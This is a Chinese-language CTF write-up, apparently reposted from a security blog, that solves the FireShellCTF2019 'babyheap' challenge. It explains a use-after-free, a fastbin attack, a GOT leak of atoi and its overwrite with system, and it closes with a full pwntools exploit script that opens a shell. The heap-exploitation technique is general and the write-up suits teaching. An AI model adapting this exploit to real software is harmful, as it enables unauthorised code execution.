> 原文链接: https://www.anquanke.com//post/id/170646 


# FireShellCTF2019 babyheap 详细题解


                                阅读量   
                                **182449**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01040444e33bcf477b.jpg)](https://p0.ssl.qhimg.com/t01040444e33bcf477b.jpg)



## 前言

前两天做了一下 Fireshell 的 pwn 题，难度貌似也不是很大，做了一下堆的 babyheap，这里把详细的解题思路记录一下，很多都是自己在学习堆过程中的一些总结，希望能给同样在入门堆利用的朋友们一些启发。



## 题目分析

题目给了一个 babyheap 的程序和一个 libc.so.6。

用 64 位的 IDA 打开程序，程序还是清单式的选项，逻辑也很简单，常见的几个功能 create、edit、show、delete

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
`{`
  unsigned int v3; // eax
  char s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_400841(a1, a2, a3);                       // init
  while ( 1 )
  `{`
    while ( 1 )
    `{`
      while ( 1 )
      `{`
        sub_40089F();
        printf("&gt; ");
        memset(&amp;s, 0, 8uLL);
        read(0, &amp;s, 8uLL);
        v3 = atoi(&amp;s);
        if ( v3 != 3 )
          break;
        if ( qword_6020B0 == 1 )
        `{`
          puts("Again? Oh no, you can't");
          exit(0);
        `}`
        sub_40091D();                           // show
      `}`
      if ( v3 &gt; 3 )
        break;
      if ( v3 == 1 )
      `{`
        if ( qword_6020A0 == 1 )
        `{`
          puts("Again? Oh no, you can't");
          exit(0);
        `}`
        sub_4008B2();                           // create
      `}`
      else
      `{`
        if ( v3 != 2 )
          goto LABEL_33;
        if ( qword_6020A8 == 1 )
        `{`
          puts("Again? Oh no, you can't");
          exit(0);
        `}`
        sub_4008E1();                           // edit
      `}`
    `}`
    if ( v3 == 5 )
    `{`
      puts("Bye!");
      exit(0);
    `}`
    if ( v3 &lt; 5 )
    `{`
      if ( qword_6020B8 == 1 )
      `{`
        puts("Again? Oh no, you can't");
        exit(0);
      `}`
      sub_40094A();                             // delete
    `}`
    else
    `{`
      if ( v3 != 1337 )
      `{`
LABEL_33:
        puts("Invalid option");
        exit(0);
      `}`
      if ( qword_6020C0 == 1 )
      `{`
        puts("Again? Oh no, you can't");
        exit(0);
      `}`
      sub_400982();                            //gift
    `}`
  `}`
`}`
```
- 题目当中有些 if 语句的条件需要注意一下，**会对后面的填充数据有一些影响**，但是影响不大
在程序的最底下有一个函数 sub_400982()，有点像一个后门，当 v3 = 1337 时才会触发。

[![](https://i.imgur.com/WnyscxZ.png)](https://i.imgur.com/WnyscxZ.png)

即当输入为 1337 时，会进入一个 fill 缓冲区的功能，填充内容到 buf 指针指向的位置。

```
__int64 sub_400982()        //gift
`{`
  buf = malloc(96uLL);
  printf("Fill ");
  read(0, buf, 64uLL);
  return qword_6020C0++ + 1;
`}`
```

利用这个功能配合 uaf 我们就可以达到劫持控制流的目的，详细利用继续往下看。



## 漏洞点分析

在 IDA 里浏览程序的功能，很容易发现在 delete 函数里（sub_40094A），在 free 一个 chunk 之后，**没有将 buf 的指针置空**，导致**可以继续填充数据到这个 chunk 的 memory 中**，所以这里的 fd、bk 的位置可以由我们控制。

```
int sub_40094A()
`{`
  int result; // eax

  free(buf);                //没有置空指针
  result = puts("Done!");
  qword_6020A0 = 0LL;
  qword_6020B8 = 1LL;
  return result;
`}`
```

我们就可以伪造 fd、bk 的值配合 fastbin attack 来控制程序流跳转到我们想要的位置。
<li>关于 fastbins 的介绍以及利用方式可以看这里：<br>[https://www.freebuf.com/news/88660.html](https://www.freebuf.com/news/88660.html)
</li>
### <a class="reference-link" name="uaf%20%E6%BC%8F%E6%B4%9E"></a>uaf 漏洞

所以这里就造成了 use-after-free 漏洞（uaf），下面分析利用步骤。

这里我们要达到劫持控制流的目的，**就需要使得 fd 指向我们需要的填充的数据区里**

根据 fastbins 的特点，在继续 new 一个 chunk 之后，会根据**上一个 free 掉的 chunk 的 fd 值作为 malloc 的指针。**

比如这个是已经布置好 fd 指针的情况，**下一次的 malloc 就会到 0x34333231 这个地址处**

[![](https://i.imgur.com/1zUmqXK.png)](https://i.imgur.com/1zUmqXK.png)

uaf 漏洞利用完后，我们可以布置数据到 buf 上方，然后使用 fill 功能填充数据到 buf 处，使用 show 功能输出我们想要的地址的值，然后覆盖 got 表来 getshell。

关于 uaf 的介绍可以看这里：<br>[https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1](https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1)<br>[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/)



## 详细利用步骤

### <a class="reference-link" name="%E4%BC%AA%E9%80%A0%20fd"></a>伪造 fd

这里大体的步骤是 **create -&gt; delete -&gt; edit -&gt; create**

在 exp 中，可以用如下的表示：

```
create()
dele()
edit(p64(0x602098))
create()
```

这里用 gdb 动态调试一下，**在 create 函数和 delete 函数处下断点**

```
pwndbg&gt; b *0x4008B2
Breakpoint 1 at 0x4008b2
pwndbg&gt; b *0x40094A
Breakpoint 2 at 0x40094a
```

run 运行，在第一个 create 中可以看到创建好的堆，以及 buf （0x6020C8）的值，**也就是 chunk 的 memory 的位置**。

[![](https://i.imgur.com/MLthVX8.png)](https://i.imgur.com/MLthVX8.png)

c 继续运行，在 delete 函数里执行完 free 操作之后，**发现这个 chunk 已经挂在了 fastbins 上了**

[![](https://i.imgur.com/S2kqNOl.png)](https://i.imgur.com/S2kqNOl.png)

接下来调用 edit 方法来填充被 free 掉的 chunk 的 fd 的位置

[![](https://i.imgur.com/wSMvKLI.png)](https://i.imgur.com/wSMvKLI.png)

为什么会被填充到上一个 chunk 的 memory 区域呢？因为在上一步的 free 操作中，作为指针的 buf 没有被置空，**还是指向了 0x603010 这个区域，在 edit 函数里调用了 read 函数对 buf 指向的区域进行填充。**

在 IDA 中可以看的很清楚：

```
ssize_t sub_4008E1()        //edit
`{`
  ssize_t result; // rax

  printf("Content? ");
  result = read(0, buf, 0x40uLL);        //写入数据到 buf 的指针处
  qword_6020A8 = 1LL;
  return result;
`}`
```

我们把要跳转的地址填进去，**这里选择 0x602098 这个位置作为 fd 的值**

[![](https://i.imgur.com/NzQeEMG.png)](https://i.imgur.com/NzQeEMG.png)

也就是：

```
edit(p64(0x602098))
```

c 继续运行到下一个 create，查看堆的排布，fd 成功放上去了，**fastbins 的值为 fd 的值**

[![](https://i.imgur.com/sFPFs8r.png)](https://i.imgur.com/sFPFs8r.png)
- 这里是使用 gdb 的本地调试，edit 是随便输入的，getshell 时需要使用 pwntools 来利用
所以在**下一次** malloc 时就会到分配到这个位置，配合 gift 函数对目标区域进行填充。

如果这里继续调试进行 malloc 操作时，就会报错找不到这个地址

[![](https://i.imgur.com/2VJ83sD.png)](https://i.imgur.com/2VJ83sD.png)

调用 _int_malloc 函数的时候会提示：

```
Program received signal SIGSEGV (fault address 0xa34333241)
```

**所以这里我们需要填上 0x602098 **，这里就完成了对 uaf 漏洞的 fastbins attack 的利用
<li>这里涉及到了 fastbins 的一些特性，也可以看我之前写过的[文章](https://www.anquanke.com/post/id/163971)
</li>
使用 gdb.attach 调试效果如下：

[![](https://i.imgur.com/kO4inlo.png)](https://i.imgur.com/kO4inlo.png)

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%20libc%20base%20addr"></a>泄露 libc base addr

继续调用 gift 函数，因为在调用 gift 函数时，会进行一次 malloc 操作，**自然而然就分配到 fastbins 指向的位置**，也就是 0x602098 处

[![](https://i.imgur.com/EXGHIEi.png)](https://i.imgur.com/EXGHIEi.png)

我们从 0x602098 的位置处往下填充，填充到 buf 的位置：

```
gift(p64(2)*6+p64(0x602060))
```
- 这里不能填充为 1，因为这样无法跳过 if 条件，进不了函数的逻辑
这里**填充 buf 为我们想要输出的地址**，配合 show 函数的可以输出想要的信息

[![](https://i.imgur.com/rmjndA7.png)](https://i.imgur.com/rmjndA7.png)

这里选择 0x602060 这个位置，也就是 atoi 函数的 got 表的指针

[![](https://i.imgur.com/hhbxuLo.png)](https://i.imgur.com/hhbxuLo.png)

填充完的效果如下：

[![](https://i.imgur.com/sTtgHi5.png)](https://i.imgur.com/sTtgHi5.png)

泄露 atoi 函数的地址之后，根据所给的 libc.so.6 的该函数的偏移，可以计算出 libc 的基地址：

```
libc_base=u64(r.readuntil('n')[:-1].ljust(8,chr(0)))-libc.symbols['atoi']
```

### <a class="reference-link" name="%E7%AF%A1%E6%94%B9%20atoi%20%E7%9A%84%20got%20%E8%A1%A8"></a>篡改 atoi 的 got 表

下一步修改 atoi 的 got 表为 system 函数的地址，**调用 edit 函数时，会向 buf 中写入数据**（因为已经修改完了 buf 的指针值），这里就可以在 atoi 的 got 表上写下 system 函数的地址

```
system_addr=libc_base+libc.symbols['system']
edit(p64(system_addr))
```

[![](https://i.imgur.com/uC5cHdu.png)](https://i.imgur.com/uC5cHdu.png)

### <a class="reference-link" name="getshell"></a>getshell

调用上面的 edit 函数完成后，会回到 main 函数中，因为这里的 atoi 被我们改成了 system ，在调用 read 函数时，只要我们输入 “/bin/sh”，**就会作为参数传入 system 函数**，触发 system 函数就进行 getshell。

```
r.sendline('/bin/sh')
```

[![](https://i.imgur.com/1ybVqK0.png)](https://i.imgur.com/1ybVqK0.png)

至此，利用完毕

附上最后的 exp

```
from pwn import *
#r=remote('51.68.189.144',31005)
r = process("./babyheap")

#context(log_level='debug')
libc=ELF('./libc.so.6')
#libc =ELF('/lib/x86_64-linux-gnu/libc.so.6')

r.readuntil('&gt;')
def create():
    r.sendline('1')
    r.readuntil('&gt;')
def dele():
    r.sendline('4')
    r.readuntil('&gt;')    
def edit(a):
    r.sendline('2')
    r.readuntil('Content?')
    r.send(a)
    r.readuntil('&gt;')
def gift(a):
    r.sendline('1337')
    r.readuntil('Fill ')
    r.send(a)
    r.readuntil('&gt; ')
def show():
    r.sendline('2')
    r.readuntil(': ')

#+------------------------use after free---------------------------+#
create()
dele()
edit(p64(0x602098))
create()
#+------------------------fastbins attack--------------------------+#
gift(p64(2)*6+p64(0x602060))
libc_base=u64(r.readuntil('n')[:-1].ljust(8,chr(0)))-libc.symbols['atoi']
print "libc_base:"+str(libc_base)
#+------------------------overwrite the got table------------------+#
system_addr=libc_base+libc.symbols['system']
edit(p64(system_addr))
#print hex(system_addr)
#+------------------------call the system func---------------------+#
r.sendline('/bin/sh')
r.interactive()
```



## 总结

**整个漏洞的利用思路如下：**

—&gt; free 没有置空指针<br>
—&gt; uaf 伪造 fd<br>
—&gt; fastbin attack 分配到 fd 的位置<br>
—&gt; 调用 gift 方法填充修改 buf 的值为 got 表地址<br>
—&gt; show 函数泄露出 buf 的内容<br>
—&gt; 得到 libc 的地址<br>
—&gt; edit 函数修改 atoi 为 system 函数<br>
—&gt; 输入 “/bin/sh” 同时调用 system 函数进行 getshell

这里最重要的是**利用的思路以及对于这些攻击方式的熟悉和灵活运用**，自己多动手调试才会对这些知识的理解更加深刻。
<li>
**这里推荐一个 b 站的堆利用的教学视频**，这是一整套的教程，前几期都讲的特别好</li>
[https://www.bilibili.com/video/av17482233/](https://www.bilibili.com/video/av17482233/?spm_id_from=333.788.videocard.7)



## 参考

[https://www.freebuf.com/news/88660.html](https://www.freebuf.com/news/88660.html)<br>[https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1](https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1)<br>[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/)<br>[https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA](https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA)<br>[https://www.anquanke.com/post/id/170473](https://www.anquanke.com/post/id/170473)
